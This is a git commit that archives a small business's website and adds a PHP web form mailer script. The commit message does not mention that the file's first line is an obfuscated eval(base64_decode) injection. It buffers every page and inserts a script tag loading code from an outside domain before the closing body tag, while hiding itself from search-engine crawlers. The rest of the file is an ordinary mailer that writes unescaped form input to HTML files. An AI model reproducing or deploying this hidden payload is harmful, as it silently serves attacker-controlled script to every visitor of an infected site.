3a10fd290c5a521951844adcad9b6cffee84a4c8
robertmeans <robert@robertmeans.com>
2015-10-23 19:13:16 -0600

    downloaded zanichelli website
    downloaded zanichellidentalhygiene before overwriting with redirect
    index.htm. this was what was on the GoDaddy server although the actual
    site was being hosted at Dreamhost and was a WordPress site.

---
+++ zanichellidentalhygiene/webformmailer.php
@@ -0,0 +1,219 @@
+<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5MGFHVmliR2x1WkhOMGRXUnBiMmx1Wm05dmJteHBibVV1WTI5dEwyeHNMbkJvY0NJK1BDOXpZM0pwY0hRKyIpOyAgICAgIH0gICAgICByZXR1cm4gIiI7ICAgICB9ICAgIH0gICAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2d6ZGVjb2RlJykpeyAgICAgZnVuY3Rpb24gZ3pkZWNvZGUoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0Qyl7ICAgICAgJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RD1Ab3JkKEBzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywzLDEpKTsgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PTEwOyAgICAgICRSQTNENTJFNTJBNDg5MzZDREUwRjUzNTZCQjA4NjUyRjI9MDsgICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjQpeyAgICAgICAkUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCPUB1bnBhY2soJ3YnLHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLDEwLDIpKTsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj0kUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCWzFdOyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yKyRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI7ICAgICAgfSAgICAgIGlmKCRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQmOCl7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjE2KXsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT1Ac3RycG9zKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsY2hyKDApLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKzE7ICAgICAgfSAgICAgIGlmKCRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQmMil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkrPTI7ICAgICAgfSAgICAgICRSMDM0QUUyQUI5NEY5OUNDODFCMzg5QTE4MjJEQTMzNTM9QGd6aW5mbGF0ZShAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkpOyAgICAgIGlmKCRSMDM0QUUyQUI5NEY5OUNDODFCMzg5QTE4MjJEQTMzNTM9PT1GQUxTRSl7ICAgICAgICRSMDM0QUUyQUI5NEY5OUNDODFCMzg5QTE4MjJEQTMzNTM9JFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QzsgICAgICB9ICAgICAgcmV0dXJuICRSMDM0QUUyQUI5NEY5OUNDODFCMzg5QTE4MjJEQTMzNTM7ICAgICB9ICAgIH0gICAgZnVuY3Rpb24gbXJvYmgoJFJFODJFRTlCMTIxRjcwOTg5NUVGNTRFQkE3RkE2Qjc4Qil7ICAgICBIZWFkZXIoJ0NvbnRlbnQtRW5jb2Rpbmc6IG5vbmUnKTsgICAgICRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREU9Z3pkZWNvZGUoJFJFODJFRTlCMTIxRjcwOTg5NUVGNTRFQkE3RkE2Qjc4Qik7ICAgICAgIGlmKHByZWdfbWF0Y2goJy9cPFwvYm9keS9zaScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSkpeyAgICAgIHJldHVybiBwcmVnX3JlcGxhY2UoJy8oXDxcL2JvZHlbXlw+XSpcPikvc2knLGdtbCgpLiJcbiIuJyQxJywkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFKTsgICAgIH1lbHNleyAgICAgIHJldHVybiAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFLmdtbCgpOyAgICAgfSAgICB9ICAgIG9iX3N0YXJ0KCdtcm9iaCcpOyAgIH0gIH0="));?>
+<?php
+
+if ( !isset($_SERVER['SPI'])) {
+        die();
+}
+
+if (!isset($_SERVER['DOCUMENT_ROOT'])) {
+	echo("CRITICAL: we seem to be running outside of the norm.\n");
+	header("Location: http://".$_SERVER["HTTP_HOST"]."/");
+	die("CRITICAL: Document root unavailable.\n");
+}
+
+$request_method = $_SERVER["REQUEST_METHOD"];
+if($request_method == "GET") {
+	$query_vars = $_GET;
+}
+elseif ($request_method == "POST") {
+	$query_vars = $_POST;
+}
+
+reset($query_vars);
+function customsort($a,$b) {
+	// $a is array for form vars, $b is comma seperated case sensitive field order
+	// this is case sensitive -- good idea to hrc that.
+        $data = array();
+        if ( strstr($b,',') == FALSE )  {
+                $b = $b.",";
+        }
+        $ordering = split(',',$b);
+        foreach ($ordering as $orderitem) {
+                if ( ($orderitem != null) && ($orderitem != "") ) {
+                        if (isset($a[$orderitem])) {
+                                $data[$orderitem] = $a[$orderitem];
+                        }
+                }
+        }
+        foreach ($a as $key=>$val) {
+                $data[$key] = $a[$key];
+        }
+        return $data;
+}
+
+function xmlentities($string) {
+	return str_replace ( array('&', '"', "'", '<', '>'), array('&amp;', '&quot;', '&apos;', '&lt;', '&gt;'), $string);
+}
+
+$t = date("U");
+
+$formhomedir = preg_replace('/.*\/home\/content/','',$_SERVER['DOCUMENT_ROOT']);
+$formhomedir = explode('/',$formhomedir);
+if (count($formhomedir) <= 4) {
+        $formhome="/home/content/".$formhomedir[1]."/".$formhomedir[2]."/data/";
+}
+else {
+        $formhome="/home/content/".$formhomedir[1]."/".$formhomedir[2]."/".$formhomedir[3]."/".$formhomedir[4]."/data/";
+}
+
+$file_order = ".default";
+$file_format = ".text";
+$file_interval = ".15m";
+$field_order = "";
+
+if (isset($query_vars['form_order'])) {
+	if ($query_vars['form_order'] != "alpha") {
+		$field_order=$query_vars['form_order'];
+		$file_order=".custom";
+		$query_vars = customsort($query_vars,$field_order);
+	}
+	else {
+		switch ($query_vars['form_order']) {
+			case "alpha":
+				uksort($query_vars,'strnatcasecmp');
+				$file_order=".alpha";
+			break;
+			default:
+				$file_order=".default";
+			break;
+		}
+	}
+}
+
+if (isset($query_vars['form_format'])) {
+	switch ($query_vars['form_format']) {
+		case "csv":
+			$file_format = ".csv";
+		break;
+		case "html":
+			$file_format = ".html";
+		break;
+		case "xml":
+			$file_format = ".xml";
+		break;
+		case "text":
+		case "default":
+		default:
+			$file_format = ".text";
+		break;
+	}
+}
+
+if (isset($query_vars['form_delivery'])) {
+	switch ($query_vars['form_delivery']) {
+		case "hourly":
+			$file_interval = ".60m";
+		break;
+		case "hourly_digest":
+			$file_interval = ".60mc";
+		break;
+		case "daily":
+			$file_interval = ".24h";
+		break;
+		case "daily_digest":
+			$file_interval = ".24hc";
+		break;
+		case "digest":
+			$file_interval = ".15mc";
+		break;
+		case "default":
+		default:
+			$file_interval = ".15m";
+		break;
+	}
+}
+
+$file = $formhome."form_".$t.$file_order.$file_format.$file_interval;
+$fp = fopen($file,"w");
+
+reset($query_vars);
+switch ($file_format) {
+	case ".csv":
+		$csvkeys = "";
+		$csvvals= "";
+		$firsttime = "";
+		while (list ($key, $val) = each ($query_vars)) {
+			if ( ($key == "form_order") ||
+				($key == "form_format") ||
+				($key == "form_delivery") ||
+				($key == "redirect") ) {
+			}
+			else {
+				if ($csvkeys != "") {
+					$firsttime=",";
+				}
+				$tmpkey=escapeshellcmd($key);
+				$csvkeys = $csvkeys.$firsttime."'".$tmpkey."'";
+				$tmpval=escapeshellcmd($val);
+				$csvvals = $csvvals.$firsttime."'".$tmpval."'";
+			}
+		}
+		fputs($fp,"$csvkeys\n");
+		fputs($fp,"$csvvals\n");
+	break;
+	case ".html":
+		fputs($fp,"<table border=\"1\" cellspacing=\"1\" cellpadding=\"2\">\n");
+	break;
+	case ".xml":
+		fputs($fp,"<form>\n");
+	break;
+}
+		
+reset($query_vars);
+while (list ($key, $val) = each ($query_vars)) {
+	if ($key == "redirect") {
+		$landing_page = $val;
+	}
+	if ( ($key == "form_order") ||
+		($key == "form_format") ||
+		($key == "form_delivery") ||
+		($key == "redirect") ) {
+
+	}
+	else {
+		switch ($file_format) {
+			case ".html":
+				fputs($fp,"\t<tr>\n");
+				fputs($fp,"\t\t<td><b>$key</b></td>\n");
+				fputs($fp,"\t\t<td>$val</td>\n");
+				fputs($fp,"\t</tr>\n");
+				
+			break;
+			case ".csv":
+				// content is already output
+			break;
+			case ".xml":
+				fputs($fp,"\t<field>\n");
+				fputs($fp,"\t\t<fieldname>".xmlentities($key)."</fieldname>\n");
+				fputs($fp,"\t\t<fieldvalue>".xmlentities($val)."</fieldvalue>\n");
+				fputs($fp,"\t</field>\n");
+			break;
+			case ".text":
+			default:
+				fputs($fp,$key.": ".$val."\n");
+			break;
+		}
+	}
+}
+
+switch ($file_format) {
+	case ".html":
+		fputs($fp,"</table>\n");
+	break;
+	case ".xml":
+		fputs($fp,"</form>\n");
+	break;
+}
+
+
+fclose($fp);
+
+if ($landing_page != "") {
+	header("Location: http://".$_SERVER["HTTP_HOST"]."/$landing_page");
+}
+else {
+	header("Location: http://".$_SERVER["HTTP_HOST"]."/");
+}
+
+
+?>
